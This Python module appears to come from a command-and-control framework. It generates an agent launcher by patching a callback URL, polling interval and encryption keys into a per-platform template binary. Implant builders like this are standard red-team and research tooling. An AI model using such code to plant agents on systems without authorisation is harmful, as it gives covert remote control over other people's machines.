import os
import json
from base64 import b64encode
from ..database.models import Listener
from malon_common.crypto.dh import KeyExchange

def create_config(listener: Listener) -> dict:
    return {
        'TargetUrl': 'http://{}:{}'.format(listener.target_host, listener.target_port),
        'ConnectionIntervalMs': listener.connection_interval_ms,
        'SymKey': b64encode(listener.sym_key).decode('utf-8'),
        'PrivateKey': b64encode(KeyExchange().get_private_key()).decode('utf-8')
    }

def render_launcher(listener: Listener, platform: str) -> bytes:
    render_dir = 'render_launcher'
    with open(os.path.join(render_dir, platform), 'rb') as f:
        agent_template_bytes = f.read()

    with open(os.path.join(render_dir, 'config_placeholder.bin'), 'rb') as f:
        placeholder_bytes = f.read()
    
    config_bytes = json.dumps(create_config(listener)).encode('utf-8')

    return agent_template_bytes.replace(
        placeholder_bytes,
        config_bytes.ljust(len(placeholder_bytes), b' ')
    )
